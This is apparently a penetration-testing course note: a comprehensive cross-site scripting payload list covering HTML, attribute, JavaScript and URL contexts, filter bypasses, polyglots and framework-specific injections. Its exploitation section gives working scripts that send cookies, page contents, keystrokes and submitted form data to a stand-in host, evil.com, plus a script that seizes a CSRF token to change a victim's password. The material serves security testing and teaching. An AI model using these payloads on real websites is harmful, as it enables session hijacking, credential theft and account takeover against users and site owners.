---
tags: [vapt, xss, reference]
difficulty: beginner
module: "07 - XSS"
topic: "07.21 XSS Payloads — Comprehensive Reference"
---

# 07.21 — XSS Payloads — Comprehensive List

## Basic Proof-of-Concept Payloads

```html
<!-- TIER 1: SIMPLEST PAYLOADS (test these first): -->
<script>alert(1)</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>

<!-- TIER 2: NO PARENTHESES: -->
<img src=x onerror=alert`1`>
<svg onload=alert`1`>

<!-- TIER 3: CLOSING TAG VARIANTS: -->
"><script>alert(1)</script>
'><script>alert(1)</script>
><script>alert(1)</script>
```

---

## HTML Context Payloads

```html
<!-- SCRIPT TAG: -->
<script>alert(document.domain)</script>
<SCRIPT>alert(1)</SCRIPT>
<script type="text/javascript">alert(1)</script>
<script language="javascript">alert(1)</script>

<!-- IMG TAG: -->
<img src=x onerror=alert(1)>
<img src="" onerror=alert(1)>
<img src=x onerror="alert(document.cookie)">
<img/src=x/onerror=alert(1)>
<img src=x onerror=alert`1`>

<!-- SVG TAG: -->
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1)>
<svg><set onbegin=alert(1) attributeName=x dur=1s>

<!-- OTHER AUTO-EXECUTE: -->
<body onload=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<iframe src="javascript:alert(1)">
<object data="javascript:alert(1)">
<embed src="javascript:alert(1)">
<form><button formaction="javascript:alert(1)">XSS
<isindex type=image src=1 onerror=alert(1)>
<math><maction actiontype="statusline" xlink:href="javascript:alert(1)">click
```

---

## Attribute Context Payloads

```html
<!-- BREAKING OUT OF DOUBLE-QUOTED ATTRIBUTE: -->
"><script>alert(1)</script>
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>

<!-- BREAKING OUT OF SINGLE-QUOTED ATTRIBUTE: -->
'><script>alert(1)</script>
' onmouseover='alert(1)
'><img src=x onerror=alert(1)>

<!-- WITHOUT BREAKING OUT (event handler injection): -->
" onmouseover="alert(1)                    ← requires hovering
" autofocus onfocus="alert(1)              ← auto-fires!
" onanimationstart="alert(1)" style="animation-name:x
" onauxclick="alert(1)                     ← middle click
```

---

## JavaScript Context Payloads

```javascript
// DOUBLE-QUOTED JS STRING:
";alert(1)//
"-alert(1)-"
");alert(1)//
</script><script>alert(1)</script>

// SINGLE-QUOTED JS STRING:
';alert(1)//
'-alert(1)-'
\';alert(1)//              ← escaped backslash bypass

// TEMPLATE LITERAL:
${alert(1)}
`;alert(1)//

// NUMERIC CONTEXT (no quotes needed):
1;alert(1)
1-alert(1)-1
```

---

## URL / href Context Payloads

```html
<!-- JAVASCRIPT: URI: -->
javascript:alert(1)
JAVASCRIPT:alert(1)
jaVaScRiPt:alert(1)
javascript:alert(document.cookie)

<!-- ENCODED VARIANTS: -->
&#106;avascript:alert(1)
&#x6a;avascript:alert(1)
java&#09;script:alert(1)        ← tab in middle
java%0Ascript:alert(1)          ← newline in middle

<!-- DATA URI: -->
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

---

## Filter Bypass Payloads

```html
<!-- CASE VARIATION: -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>

<!-- HTML ENTITY ENCODING: -->
<svg onload=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

<!-- NO QUOTES (unquoted attributes): -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>

<!-- BACKTICK INSTEAD OF PARENS: -->
<img src=x onerror=alert`1`>
<svg onload=confirm`1`>

<!-- BASE64 EVAL: -->
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<!-- atob('YWxlcnQoMSk=') = alert(1) -->

<!-- STRING CONSTRUCTION: -->
<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>

<!-- COMMENT BYPASS: -->
<scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>

<!-- WHITESPACE VARIATIONS: -->
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>

<!-- ALTERNATIVE ALERT FUNCTIONS: -->
<img src=x onerror=confirm(1)>
<img src=x onerror=prompt(1)>
<img src=x onerror=print()>
```

---

## Exploitation Payloads (Real Impact)

### Cookie Theft

```javascript
// BASIC:
<script>new Image().src='https://evil.com/?c='+document.cookie</script>

// BASE64 ENCODED:
<script>new Image().src='https://evil.com/?c='+btoa(document.cookie)</script>

// FETCH:
<script>fetch('https://evil.com/c',{method:'POST',body:document.cookie,mode:'no-cors'})</script>

// IN ATTRIBUTE CONTEXT:
"><script>new Image().src='https://evil.com/?c='+document.cookie</script>

// SVG (bypasses many filters):
<svg onload="fetch('https://evil.com/?c='+btoa(document.cookie))">
```

### Full Page Capture

```javascript
<script>
fetch('https://evil.com/page',{
  method:'POST',
  body:btoa(document.body.innerHTML),
  mode:'no-cors'
})
</script>
```

### Account Takeover (Change Password)

```javascript
<script>
fetch('/settings',{credentials:'include'})
.then(r=>r.text())
.then(h=>{
  var c=new DOMParser().parseFromString(h,'text/html').querySelector('[name=csrf_token]').value;
  return fetch('/settings/password',{method:'POST',credentials:'include',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'csrf_token='+c+'&password=Hacked123!'})
})
</script>
```

### Keylogger

```javascript
<script>document.addEventListener('keypress',function(e){new Image().src='https://evil.com/k?k='+e.key})</script>
```

### Form Hijacker

```javascript
<script>
document.addEventListener('submit',function(e){
  var d={};
  Array.from(e.target.elements).forEach(f=>{if(f.name)d[f.name]=f.value});
  fetch('https://evil.com/form',{method:'POST',body:JSON.stringify(d),mode:'no-cors'});
})
</script>
```

---

## Polyglot Payloads

```html
<!-- WORKS IN MULTIPLE CONTEXTS: -->
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//>

<!-- SHORTER POLYGLOT: -->
'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&amp;#41>

<!-- PRACTICAL POLYGLOT (shorter): -->
';alert(1)//';alert(1)//";alert(1)//";alert(1)//--></SCRIPT>">'><SCRIPT>alert(1)</SCRIPT>
```

---

## Platform-Specific Payloads

### WordPress

```html
<!-- COMMENT FIELD: -->
<script>alert(1)</script>
<!-- If filtered: -->
<img src=x onerror=alert(1)>

<!-- SHORTCODE INJECTION: -->
[caption lang="a"]"><script>alert(1)</script>
```

### React / Angular / Vue

```javascript
// ANGULAR TEMPLATE INJECTION:
{{constructor.constructor('alert(1)')()}}
{{7*7}}     ← test first, if returns 49 → injectable

// REACT dangerouslySetInnerHTML (if developer made this mistake):
// Find: dangerouslySetInnerHTML={{__html: userInput}}
// → Inject: <img src=x onerror=alert(1)>

// VUE (older versions):
{{_c('script',['alert(1)'])}}
```

### JSON APIs

```json
// IF CONTENT-TYPE IS text/html:
{"name":"<script>alert(document.cookie)</script>"}
{"callback":"alert(1)//"}
```

---

## XSS Cheat Sheet Quick Reference

```
CONTEXT        | BREAK OUT WITH    | PAYLOAD
HTML body      | N/A               | <script>alert(1)</script>
HTML attr ""   | "                 | "><script>alert(1)</script>
HTML attr ''   | '                 | '><script>alert(1)</script>
JS string ""   | "                 | ";alert(1)//
JS string ''   | '                 | ';alert(1)//
JS template    | `                 | ${alert(1)}
URL/href       | N/A               | javascript:alert(1)
CSS            | </style>          | </style><img src=x onerror=alert(1)>
```

---

## Related Notes
- [[14 - XSS Filter Bypass Techniques]] — bypass techniques explained
- [[15 - CSP Bypass for XSS]] — bypassing CSP
- [[22 - XSS Tools XSStrike dalfox]] — automated payload generation
- [[16 - XSS to Session Hijacking]] — exploitation
- [[17 - XSS to Account Takeover]] — ATO payloads
